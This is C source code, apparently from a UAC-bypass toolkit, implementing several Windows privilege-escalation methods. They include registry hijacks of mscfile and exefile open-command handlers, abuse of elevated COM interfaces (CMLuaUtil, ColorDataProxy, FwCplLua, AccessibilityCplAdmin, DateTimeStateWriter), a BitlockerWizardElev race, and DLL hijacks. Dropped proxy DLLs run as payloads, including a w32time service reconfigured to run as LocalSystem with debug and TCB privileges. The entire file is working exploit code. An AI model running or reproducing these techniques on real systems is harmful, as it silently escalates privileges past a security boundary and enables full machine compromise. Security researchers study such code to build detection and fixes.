        // Create controlled mscfile entry.
        //
        _strcpy(szKey, T_MSC_SHELL);
        _strcat(szKey, T_SHELL_OPEN_COMMAND);
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
            szKey,
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            MAXIMUM_ALLOWED,
            NULL,
            &hKey,
            &dwKeyDisposition);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set "Default" value as our payload.
        // 
        sz = (1 + sz) * sizeof(WCHAR);
        lResult = ERROR_ACCESS_DENIED;

        switch (g_ctx->MethodExecuteType) {

        case ucmExTypeIndirectModification:

            if (supIndirectRegAdd(REG_HKCU,
                szKey,
                NULL,
                NULL,
                lpszPayload))
            {
                lResult = ERROR_SUCCESS;
            }

            break;

        case ucmExTypeRegSymlink:

            if (NT_SUCCESS(supRegSetValueIndirectHKCU(
                szKey,
                NULL,
                lpszPayload,
                (ULONG)sz)))
            {
                bSymLinkCleanup = TRUE;
                lResult = ERROR_SUCCESS;
            }

            break;

        case ucmExTypeDefault:
        default:

            lResult = RegSetValueEx(
                hKey,
                TEXT(""),
                0,
                REG_SZ,
                (BYTE*)lpszPayload,
                (DWORD)sz);

            break;
        }

        RegCloseKey(hKey);
        hKey = NULL;

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Get elevated COM object for FwCplLua interface.
        //
        r = ucmAllocateElevatedObject(
            T_CLSID_FwCplLua,
            &IID_IFwCplLua,
            CLSCTX_LOCAL_SERVER,
            &FwCplLua);

        if (r != S_OK)
            break;

        if (FwCplLua == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        //
        // Execute method from FwCplLua interface.
        // This will trigger our payload as shell will attempt to run it.
        //
        r = FwCplLua->lpVtbl->LaunchAdvancedUI(FwCplLua);
        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (hKey != NULL)
        RegCloseKey(hKey);

    if (FwCplLua != NULL) {
        FwCplLua->lpVtbl->Release(FwCplLua);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    //
    // Remove symlink.
    //
    if (bSymLinkCleanup)
        supRemoveRegLinkHKCU();

    //
    // Remove key with all subkeys.
    //
    if (dwKeyDisposition == REG_CREATED_NEW_KEY)
        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSC_SHELL);

    return MethodResult;
}

/*
* ucmDccwCOMMethod
*
* Purpose:
*
* Bypass UAC using ColorDataProxy/CCMLuaUtil undocumented COM interfaces.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
NTSTATUS ucmDccwCOMMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
    HRESULT          r = E_FAIL, hr_init;
    BOOL             bIntApproved1 = FALSE, bIntApproved2 = FALSE;

    SIZE_T           sz = 0;

    ICMLuaUtil      *CMLuaUtil = NULL;
    IColorDataProxy *ColorDataProxy = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {
        //
        // Potential fix check.
        //
        if (supIsConsentApprovedInterface(T_CLSID_ColorDataProxy, &bIntApproved1)) {
            if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bIntApproved2))
                if ((bIntApproved1 == FALSE) || (bIntApproved2 == FALSE)) {
                    if (ucmShowQuestion(UACFIX) != IDYES) {
                        MethodResult = STATUS_CANCELLED;
                        break;
                    }
                }
        }


        sz = _strlen(lpszPayload);
        if (sz == 0) {
            MethodResult = STATUS_INVALID_PARAMETER;
            break;
        }

        //
        // Create elevated COM object for CMLuaUtil.
        //
        r = ucmAllocateElevatedObject(
            T_CLSID_CMSTPLUA,
            &IID_ICMLuaUtil,
            CLSCTX_LOCAL_SERVER,
            &CMLuaUtil);

        if (r != S_OK) {
            break;
        }

        if (CMLuaUtil == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        //
        // Write new custom calibrator value to HKLM.
        //
        r = CMLuaUtil->lpVtbl->SetRegistryStringValue(CMLuaUtil,
            HKEY_LOCAL_MACHINE,
            T_DISPLAY_CALIBRATION,
            T_CALIBRATOR_VALUE,
            lpszPayload);

        if (FAILED(r)) {
            break;
        }

        //
        // Create elevated COM object for ColorDataProxy.
        //
        r = ucmAllocateElevatedObject(
            T_CLSID_ColorDataProxy,
            &IID_IColorDataProxy,
            CLSCTX_LOCAL_SERVER,
            &ColorDataProxy);


        if (r != S_OK) {
            break;
        }

        if (ColorDataProxy == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        //
        // Run our "custom calibrator".
        //
        r = ColorDataProxy->lpVtbl->LaunchDccw(ColorDataProxy, 0);

        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

        Sleep(1000);

        //
        // Remove calibrator value.
        //
        CMLuaUtil->lpVtbl->DeleteRegistryStringValue(CMLuaUtil,
            HKEY_LOCAL_MACHINE,
            T_DISPLAY_CALIBRATION,
            T_CALIBRATOR_VALUE);

    } while (FALSE);

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (ColorDataProxy != NULL) {
        ColorDataProxy->lpVtbl->Release(ColorDataProxy);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

/*
* ucmBitlockerRCMethod
*
* Purpose:
*
* Bypass UAC using BitlockerWizardElev race condition.
*
* Fixed in Windows 10 RS4
*
*/
NTSTATUS ucmBitlockerRCMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

#ifndef _WIN64
    NTSTATUS Status;
#endif

    BOOL bNeedCleanup = FALSE;
    HKEY hKey = NULL;
    LRESULT lResult;
    DWORD cbData = 0;
    WCHAR szKey[MAX_PATH];
    WCHAR szTargetApp[MAX_PATH * 2];

    SHELLEXECUTEINFO shinfo;

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        Status = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(Status))
            return Status;
    }
#endif

#ifndef _DEBUG
    _strcpy(szTargetApp, g_ctx->szSystemDirectory);
    _strcat(szTargetApp, BITLOCKERWIZARDELEV_EXE);
    if (!PathFileExists(szTargetApp))
        return STATUS_OBJECT_NAME_NOT_FOUND;
#endif

    //
    // Create or open target key.
    //
    _strcpy(szKey, T_EXEFILE_SHELL);
    _strcat(szKey, T_SHELL_OPEN_COMMAND);
    lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
        REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
    if (lResult == ERROR_SUCCESS) {

        //
        // Launch target application and suspend it.
        //
        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = szTargetApp;
        shinfo.lpParameters = TEXT("X: P F");
        shinfo.lpDirectory = NULL;
        shinfo.nShow = SW_SHOW;
        if (ShellExecuteEx(&shinfo)) {
            NtSuspendProcess(shinfo.hProcess);

            //
            // Set new exefile handler.
            //
            cbData = (DWORD)((1 + _strlen(lpszPayload)) * sizeof(WCHAR));
            lResult = RegSetValueEx(
                hKey,
                TEXT(""),
                0,
                REG_SZ,
                (BYTE*)lpszPayload,
                cbData);

            bNeedCleanup = (lResult == ERROR_SUCCESS);

            if (bNeedCleanup)
                RegFlushKey(hKey);

            //
            // Resume target application.
            //
            NtResumeProcess(shinfo.hProcess);
            if (WaitForSingleObject(shinfo.hProcess, 5000) == WAIT_TIMEOUT)
                NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);

            NtClose(shinfo.hProcess);
            if (bNeedCleanup) {
                RegDeleteValue(hKey, TEXT(""));
                RegFlushKey(hKey);
            }

            MethodResult = STATUS_SUCCESS;
        }
        RegCloseKey(hKey);
    }

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif

    return MethodResult;
}

/*
* ucmCOMHandlersMethod2
*
* Purpose:
*
* Bypass UAC using fake COM class handler.
* https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/
* https://offsec.provadys.com/UAC-bypass-dotnet.html
*
* Produced mixed results since Windows 10 RS4.
*
*/
NTSTATUS ucmCOMHandlersMethod2(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    BOOL bNeedCleanup = FALSE, bRemoveFile = FALSE;

    DWORD cbData = 0;
    LRESULT lResult;

    WCHAR *s, *d;

    HKEY SourceKey = NULL, DestKey = NULL;

    WCHAR szBuffer[MAX_PATH * 2], szKey[MAX_PATH * 2];
    WCHAR szConvertedName[MAX_PATH * 3];

#ifdef _DEBUG
    g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
#endif

    do {

        //
        // Drop Fujinami to the %temp%
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, FUJINAMI_DLL);
        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        bRemoveFile = TRUE;

        //
        // Copy existing COM handler entry.
        //
        _strcpy(szKey, TEXT("CLSID\\"));
        _strcat(szKey, T_MMCFrameworkSnapInFactory);

        lResult = RegOpenKeyEx(HKEY_CLASSES_ROOT, szKey, 0, KEY_READ, &SourceKey);
        if (lResult != ERROR_SUCCESS)
            break;

        _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szKey, T_MMCFrameworkSnapInFactory);

        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &DestKey, NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        bNeedCleanup = TRUE;

        lResult = RegCopyTree(SourceKey, NULL, DestKey);
        if (lResult != ERROR_SUCCESS)
            break;

        RegCloseKey(SourceKey);
        SourceKey = NULL;

        RegCloseKey(DestKey);
        DestKey = NULL;

        //
        // Modify entry.
        //
        _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szKey, T_MMCFrameworkSnapInFactory);
        _strcat(szKey, T_REG_INPROCSERVER32);
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &SourceKey, NULL);
        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set Assembly value.
        //
        cbData = (DWORD)((1 + _strlen(T_FUJINAMI_ASSEMBLY)) * sizeof(WCHAR));
        lResult = RegSetValueEx(
            SourceKey,
            T_ASSEMBLY,
            0,
            REG_SZ,
            (BYTE*)T_FUJINAMI_ASSEMBLY,
            cbData);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set Class value.
        //
        cbData = (DWORD)((1 + _strlen(T_FUJINAMI_CLASS)) * sizeof(WCHAR));
        lResult = RegSetValueEx(
            SourceKey,
            T_CLASS,
            0,
            REG_SZ,
            (BYTE*)T_FUJINAMI_CLASS,
            cbData);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set CodeBase value.
        //
        RtlSecureZeroMemory(szConvertedName, sizeof(szConvertedName));
        _strcpy(szConvertedName, T_FILE_PREP);

        s = szBuffer;
        d = _strend(szConvertedName);

        while (*s != 0) {
            if (*s == L'\\') {
                *d = L'/';
                d++;
                *d = L'/';
                d++;
            }
            else {
                *d = *s;
                d++;
            }
            s++;
        }

        lResult = ERROR_ACCESS_DENIED;

        switch (g_ctx->MethodExecuteType) {

        case ucmExTypeIndirectModification:

            if (supIndirectRegAdd(REG_HKCU,
                szKey,
                T_CODEBASE,
                T_REG_SZ,
                szConvertedName))
            {
                lResult = ERROR_SUCCESS;
            }

            break;

        case ucmExTypeDefault:
        default:
            cbData = (DWORD)((1 + _strlen(szConvertedName)) * sizeof(WCHAR));
            lResult = RegSetValueEx(
                SourceKey,
                T_CODEBASE,
                0,
                REG_SZ,
                (BYTE*)szConvertedName,
                cbData);
            break;
        }

        if (lResult != ERROR_SUCCESS)
            break;

        RegCloseKey(SourceKey);
        SourceKey = NULL;

        _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szKey, T_MMCFrameworkSnapInFactory);
        _strcat(szKey, T_REG_INPROCSERVER32);
        _strcat(szKey, TEXT("\\3.0.0.0"));
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &SourceKey, NULL);
        if (lResult != ERROR_SUCCESS)
            break;

        lResult = ERROR_ACCESS_DENIED;

        switch (g_ctx->MethodExecuteType) {

        case ucmExTypeIndirectModification:

            if (supIndirectRegAdd(REG_HKCU,
                szKey,
                T_CODEBASE,
                T_REG_SZ,
                szConvertedName))
            {
                lResult = ERROR_SUCCESS;
            }

            break;

        case ucmExTypeDefault:
        default:
            //
            // Set CodeBase value.
            // cbData unchanged.
            //
            lResult = RegSetValueEx(
                SourceKey,
                T_CODEBASE,
                0,
                REG_SZ,
                (BYTE*)szConvertedName,
                cbData);
            break;
        }

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set Assembly value.
        //
        cbData = (DWORD)((1 + _strlen(T_FUJINAMI_ASSEMBLY)) * sizeof(WCHAR));
        lResult = RegSetValueEx(
            SourceKey,
            T_ASSEMBLY,
            0,
            REG_SZ,
            (BYTE*)T_FUJINAMI_ASSEMBLY,
            cbData);

        if (lResult != ERROR_SUCCESS)
            break;

        //
        // Set Class value.
        //
        cbData = (DWORD)((1 + _strlen(T_FUJINAMI_CLASS)) * sizeof(WCHAR));
        lResult = RegSetValueEx(
            SourceKey,
            T_CLASS,
            0,
            REG_SZ,
            (BYTE*)T_FUJINAMI_CLASS,
            cbData);

        if (lResult != ERROR_SUCCESS)
            break;

        RegCloseKey(SourceKey);
        SourceKey = NULL;

        //
        // Run target.
        //
        if (supRunProcess(MMC_EXE, EVENTVWR_MSC))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (SourceKey != NULL) RegCloseKey(SourceKey);
    if (DestKey != NULL) RegCloseKey(DestKey);

    if (bNeedCleanup) {
        _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szKey, T_MMCFrameworkSnapInFactory);
        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, szKey);
    }
    if (bRemoveFile) {
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, FUJINAMI_DLL);
        DeleteFile(szBuffer);
    }

    return MethodResult;
}

/*
* ucmxSetResetW32TimeSvcParams
*
* Purpose:
*
* Set or reset to original w32time service params.
*
*/
BOOL ucmxSetResetW32TimeSvcParams(
    _In_ ISLLUACOM *SPLuaObject,
    _In_opt_ LPWSTR lpServiceDll,
    _In_ BOOL Set
)
{
    HRESULT                 hr;

    PWSTR                   Ptr;

    PWSTR                   RequiredPrivileges =
        L"SeAssignPrimaryTokenPrivilege\0SeImpersonatePrivilege\0SeDebugPrivilege\0SeTcbPrivilege\0\0";

    PWSTR                   RequiredPrivilegesDefault =
        L"SeAuditPrivilege\0SeChangeNotifyPrivilege\0SeCreateGlobalPrivilege\0SeSystemTimePrivilege\0\0";

    PWSTR                   PrivSet, pServiceDll, pImagePath;

    ULONG                   DataSize, Length, ServiceType;

    WCHAR                   szLocal[MAX_PATH], szServiceDll[MAX_PATH];

    RtlSecureZeroMemory(szLocal, sizeof(szLocal));
    RtlSecureZeroMemory(szServiceDll, sizeof(szServiceDll));

    if (Set) {
        if (lpServiceDll == NULL)
            return FALSE;

        pServiceDll = lpServiceDll;
        PrivSet = RequiredPrivileges;
        _strcpy(szLocal, OBJECT_LOCALSYSTEM);
    }
    else {
        _strcpy(szServiceDll, L"%systemroot%\\system32\\w32time.dll");
        pServiceDll = szServiceDll;
        PrivSet = RequiredPrivilegesDefault;
        _strcpy(szLocal, OBJECT_LOCALSERVICE);
    }

    //
    // Set RequiredPrivileges.
    //
    Ptr = PrivSet;
    DataSize = 0;

    while (*Ptr) {
        Length = (ULONG)_strlen(Ptr) + 1;
        Ptr = Ptr + Length;
        DataSize += Length;
    }

    DataSize = (DataSize * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
    hr = ucmSPLUAObjectRegSetValue(
        SPLuaObject,
        SSLUA_HKEY_LOCAL_MACHINE,
        W32TIME_SERVICE_PATH,
        SVC_REQ_PRIVS,
        REG_MULTI_SZ,
        PrivSet,
        DataSize);

    if (SUCCEEDED(hr)) {

        //
        // Set ObjectName. 
        //  

        DataSize = (ULONG)((1 + _strlen(szLocal)) * sizeof(WCHAR));
        hr = ucmSPLUAObjectRegSetValue(
            SPLuaObject,
            SSLUA_HKEY_LOCAL_MACHINE,
            W32TIME_SERVICE_PATH,
            SVC_OBJECT_NAME,
            REG_SZ,
            szLocal,
            DataSize);

        if (SUCCEEDED(hr)) {

            //
            // Set ServiceDll.
            //
            if (g_ctx->dwBuildNumber >= 10240) {
                DataSize = (ULONG)((1 + _strlen(pServiceDll)) * sizeof(WCHAR));
                hr = ucmSPLUAObjectRegSetValue(
                    SPLuaObject,
                    SSLUA_HKEY_LOCAL_MACHINE,
                    W32TIME_SERVICE_PARAMETERS,
                    SVC_SERVICE_DLL,
                    REG_EXPAND_SZ,
                    pServiceDll,
                    DataSize);

            }
        }
    }

    //
    // Running in EXE mode.
    //
    if (g_ctx->dwBuildNumber <= 9600) {

        if (Set) {
            ServiceType = SERVICE_WIN32_OWN_PROCESS;
            pImagePath = pServiceDll;
        }
        else {
            ServiceType = SERVICE_WIN32_SHARE_PROCESS;
            pImagePath = L"%SystemRoot%\\system32\\svchost.exe -k LocalService";
        }

        //
        // Set service type.
        //

        DataSize = sizeof(ULONG);

        hr = ucmSPLUAObjectRegSetValue(
            SPLuaObject,
            SSLUA_HKEY_LOCAL_MACHINE,
            W32TIME_SERVICE_PATH,
            SVC_TYPE,
            REG_DWORD,
            (PVOID)&ServiceType,
            DataSize);

        if (SUCCEEDED(hr)) {

            //
            // Set service imagepath.
            //
            DataSize = (ULONG)((1 + _strlen(pImagePath)) * sizeof(WCHAR));
            hr = ucmSPLUAObjectRegSetValue(
                SPLuaObject,
                SSLUA_HKEY_LOCAL_MACHINE,
                W32TIME_SERVICE_PATH,
                SVC_IMAGE_PATH,
                REG_EXPAND_SZ,
                pImagePath,
                DataSize);
        }
    }

    return SUCCEEDED(hr);
}

/*
* ucmxTrackService
*
* Purpose:
*
* Track service state.
*
*/
DWORD ucmxTrackService()
{
    SC_HANDLE schManager, schService;

    SERVICE_STATUS_PROCESS Status;

    ULONG dummy, svcstate = 0;

    schManager = OpenSCManager(
        NULL,
        NULL,
        SC_MANAGER_CONNECT);

    if (schManager) {

        schService = OpenService(
            schManager,
            W32TIME_SERVICE_NAME,
            SERVICE_QUERY_STATUS);

        if (schService) {

            if (QueryServiceStatusEx(
                schService,
                SC_STATUS_PROCESS_INFO,
                (LPBYTE)&Status,
                sizeof(Status),
                &dummy))
            {
                svcstate = Status.dwCurrentState;
            }

            CloseServiceHandle(schService);
        }
        CloseServiceHandle(schManager);
    }

    return svcstate;
}

/*
* ucmDateTimeStateWriterMethod
*
* Purpose:
*
* Exploit IDateTimeStateWriter undocumented COM interface which allows
* elevated start/stop control over w32time service.
*
* Used in with deroko method which provide elevated RegSetValueEx functionality.
*
* Fixed in Windows 10 RS5.
*
*/
NTSTATUS ucmDateTimeStateWriterMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS                MethodResult = STATUS_ACCESS_DENIED;
    ULONG                   I, svcstate;
    HRESULT                 hr, hr_init;
    HANDLE                  hSvcStopEvent = NULL;
    IDateTimeStateWriter   *Dtsw = NULL;
    ISLLUACOM              *SPLuaObject = NULL;

    UNICODE_STRING          usSignalEvent = RTL_CONSTANT_STRING(SIGNAL_OBJECT);

    OBJECT_ATTRIBUTES       obja;

    LARGE_INTEGER           liDueTime;

    WCHAR                   szServiceBinary[MAX_PATH * 2];

    RtlSecureZeroMemory(szServiceBinary, sizeof(szServiceBinary));

    //
    // Drop payload to %temp%.
    //
    if (g_ctx->dwBuildNumber >= 10240) {
        _strcpy(szServiceBinary, g_ctx->szTempDirectory);
        _strcat(szServiceBinary, W32TIME_DLL);
        if (!supWriteBufferToFile(szServiceBinary, ProxyDll, ProxyDllSize))
            return MethodResult;
    }
    else {

        if (supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            CHIYODA_EXT_ENTRYPOINT,
            TRUE) == FALSE)
        {
            return MethodResult;
        }

        _strcpy(szServiceBinary, g_ctx->szTempDirectory);
        _strcat(szServiceBinary, MYSTERIOUSCUTETHING);
        _strcat(szServiceBinary, L".exe");
        if (!supWriteBufferToFile(szServiceBinary, ProxyDll, ProxyDllSize))
            return MethodResult;
    }

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //
        // Create ping back notification event in nonsignaled state.
        //
        InitializeObjectAttributes(&obja, &usSignalEvent, OBJ_CASE_INSENSITIVE, NULL, NULL);

        if (!NT_SUCCESS(NtCreateEvent(
            &hSvcStopEvent,
            EVENT_ALL_ACCESS,
            &obja,
            NotificationEvent,
            FALSE)))
        {
            break;
        }

        //
        // Allocate SPLuaObject.
        //
        hr = ucmAllocateElevatedObject(
            T_CLSID_SPPLUAObject,
            &IID_ISPPLUAObject,
            CLSCTX_LOCAL_SERVER,
            &SPLuaObject);

        if (hr != S_OK)
            break;

        //
        // Allocate DateTimeStateWriter.
        //
        hr = ucmAllocateElevatedObject(
            T_CLSID_DateTimeStateWriter,
            &IID_DateTimeStateWriter,
            CLSCTX_LOCAL_SERVER,
            &Dtsw);

        if (hr != S_OK)
            break;

        //
        // Stop and Disable w32time.
        //
        hr = Dtsw->lpVtbl->StopAndDisableService(Dtsw);
        if (hr != S_OK)
            break;

        Sleep(1000);

        if (!ucmxSetResetW32TimeSvcParams(
            SPLuaObject,
            szServiceBinary,
            TRUE))
        {
            break;
        }

        I = 5;

        do {
            supDbgMsg(L"app>>svc start try");

            hr = Dtsw->lpVtbl->StartServiceAndRefresh(Dtsw, 0);
            if (hr != S_OK)
                break;

            svcstate = ucmxTrackService();

            if ((svcstate == SERVICE_RUNNING) ||
                (svcstate == SERVICE_START_PENDING))
            {
                supDbgMsg(L"app>>started");
                break;
            }

            Sleep(1000);
            --I;

        } while (I);

        if (FAILED(hr)) {
            supDbgMsg(L"app>>StartServiceAndRefresh failed");
            ucmxSetResetW32TimeSvcParams(SPLuaObject, NULL, FALSE);
            break;
        }

        MethodResult = STATUS_SUCCESS;

        //
        // Wait some time for ping back.
        // We can't exit without ping back because:
        // - IPC link will be destroyed
        //   - Payload cannot normally run
        //       
        supDbgMsg(L"app>>waiting for an event\r\n");
        liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(20000, 10000);
        NtWaitForSingleObject(hSvcStopEvent, FALSE, &liDueTime);
        supDbgMsg(L"app>>wait complete\r\n");

    } while (FALSE);

    if (hSvcStopEvent)
        NtClose(hSvcStopEvent);

    if (SPLuaObject)
        SPLuaObject->lpVtbl->Release(SPLuaObject);

    if (Dtsw)
        Dtsw->lpVtbl->Release(Dtsw);

    if (hr_init == S_OK)
        CoUninitialize();

    DeleteFile(szServiceBinary);

    return MethodResult;
}

/*
* ucmAcCplAdminMethod
*
* Purpose:
*
* Bypass UAC using registry HKCU\Software\Classes\exefile\shell\open hijack and AccessibilityCplAdmin elevated launch.
*
* Fixed in Windows 10 RS4
*
*/
NTSTATUS ucmAcCplAdminMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS                MethodResult = STATUS_ACCESS_DENIED;

    BOOL                    bValueSet = FALSE;
    IAccessibilityCplAdmin *AdminElevate = NULL;
    HRESULT                 hr = E_FAIL, hr_init;
    HKEY                    hKey = NULL;
    DWORD                   cbData = 0, dwDisposition = 0;
    WCHAR                   szKeyName[MAX_PATH];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    _strcpy(szKeyName, T_EXEFILE_SHELL);
    _strcat(szKeyName, T_SHELL_OPEN_COMMAND);

    hr = ucmAllocateElevatedObject(
        T_CLSID_AcCplAdmin,
        &IID_IAccessibilityCplAdmin,
        CLSCTX_LOCAL_SERVER,
        &AdminElevate);

    if (SUCCEEDED(hr)) {

        if (ERROR_SUCCESS == RegCreateKeyEx(
            HKEY_CURRENT_USER,
            szKeyName,
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            MAXIMUM_ALLOWED,
            NULL,
            &hKey,
            &dwDisposition))
        {
            cbData = (DWORD)((1 + _strlen(lpszPayload)) * sizeof(WCHAR));

            if (ERROR_SUCCESS == RegSetValueEx(
                hKey,
                TEXT(""),
                0, REG_SZ,
                (BYTE*)lpszPayload,
                cbData))
            {
                RegFlushKey(hKey);
                RegCloseKey(hKey);

                bValueSet = TRUE;

                hr = AdminElevate->lpVtbl->LinktoSystemRestorePoint(AdminElevate);
                if (SUCCEEDED(hr))
                    MethodResult = STATUS_SUCCESS;
            }
            else {
                RegCloseKey(hKey);
            }
        }
        AdminElevate->lpVtbl->Release(AdminElevate);
    }

    if (dwDisposition == REG_CREATED_NEW_KEY) {
        supRegDeleteKeyRecursive(
            HKEY_CURRENT_USER,
            T_EXEFILE_SHELL);
    }
    else {
        if (bValueSet) {
            supDeleteKeyValueAndFlushKey(
                HKEY_CURRENT_USER,
                szKeyName,
                TEXT(""));
        }
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

/*
* ucmEgre55Method
*
* Purpose:
*
* Bypass UAC by DLL hijack of SystemProperties* commands.
* Original author link: https://egre55.github.io/system-properties-uac-bypass/
*
* Note:
*
* This code expects to work under wow64 only because of uacme restrictions.
* However you can extent it to force drop your *32* bit dll from your *64* bit application.
*
*/
NTSTATUS ucmEgre55Method(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    PWSTR pTmp = NULL, lpDest = NULL;

    SIZE_T Length;

    WCHAR szBuffer[MAX_PATH * 2];

    do {

        if (FAILED(SHGetKnownFolderPath(&FOLDERID_LocalAppData, KF_FLAG_DEFAULT, NULL, (PWSTR*)&pTmp)))
            break;

        Length = _strlen(pTmp);
        if (Length == 0)
            break;

        Length = (MAX_PATH + Length) * sizeof(WCHAR);
        lpDest = (PWSTR)supHeapAlloc(Length);
        if (lpDest == NULL)
            break;

        _strcpy(lpDest, pTmp);
        _strcat(lpDest, TEXT("\\Microsoft\\WindowsApps\\"));
        _strcat(lpDest, SRRSTR_DLL);

        if (!supWriteBufferToFile(lpDest, ProxyDll, ProxyDllSize))
            break;

        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, SYSTEMROPERTIESADVANCED_EXE);
        if (supRunProcess(szBuffer, NULL))
            MethodResult = STATUS_SUCCESS;

        DeleteFile(lpDest);

    } while (FALSE);

    if (pTmp) CoTaskMemFree((LPVOID)pTmp);
    if (lpDest) supHeapFree(lpDest);

    return MethodResult;
}
